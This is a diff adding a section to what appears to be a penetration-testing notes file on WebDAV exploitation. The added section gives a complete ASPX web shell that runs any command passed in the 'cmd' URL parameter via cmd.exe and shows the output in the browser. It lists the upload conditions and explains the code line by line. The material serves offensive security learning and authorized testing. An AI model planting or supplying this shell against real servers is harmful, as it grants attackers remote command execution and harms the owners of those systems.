@@ -209,3 +209,25 @@ If WebDAV directory has writing and file execution permission, uploading an ASPX
 1. WebDAV is enabled
 2. Cred are valid with writing permission
 3. Script execution is set
+
+### Preparing the ASPX shell
+
+Script for getting shell with aspx: (Remote code execution)
+
+`<​%@ Page Language="C#" %​>
+<​% 
+  string cmd = Request.QueryString["cmd"];
+  if (!string.IsNullOrEmpty(cmd)) {
+    var proc = new System.Diagnostics.Process();
+    proc.StartInfo.FileName = "cmd.exe";
+    proc.StartInfo.Arguments = "/c " + cmd;
+    proc.StartInfo.UseShellExecute = false;
+    proc.StartInfo.RedirectStandardOutput = true;
+    proc.Start();
+    Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
+  }
+%​>`
+
+This script is looks for word 'cmd' in the URL, and checks if the cmd variable is not empty.
+Then it starts new cmd.exe program. Using /c flag script it passes users input string to the command line.
+Finally the script shows output directly in the browser by using "pre" html tags.
